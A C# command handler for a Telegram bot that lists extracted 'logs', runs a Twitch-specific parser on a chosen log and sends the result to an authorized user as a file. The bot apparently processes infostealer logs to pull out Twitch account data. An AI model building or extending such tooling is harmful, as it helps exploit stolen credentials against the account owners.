using System.Text;
using Core.Parsers.Services;
using TelegramBot.Extensions;
using TelegramBot.Models;
using TelegramBot.Services;
using TL;
using WTelegram;

namespace TelegramBot.Commands.Services;

public class TwitchServiceCommand(Client client, DataService data, Random random) : ICommand, ICallbackCommand
{
    public bool AuthorizedOnly { get; } = true;

    // ◀️▶️
    public Task Invoke(UpdateNewMessage update, User user) => client.SendMessageAvailableLogs(user, data, random, "Twitch");

    public async Task Invoke(UpdateBotCallbackQuery update, User user)
    {
        if (update.data.Length == 1)
        {
            await client.SendCallbackAvailableLogs(user, data, update.msg_id, update.data);
            
            return;
        }

        var logspath = data.GetExtractedPath(Encoding.UTF8.GetString(update.data));
        var filepath = await data.SaveAsync(
            logspath[(logspath.LastIndexOf('\\') + 1)..],
            logspath.TwitchFromLogs(),
            name: "Twitch");

        await data.SendFileAsync(user, filepath);
    }
}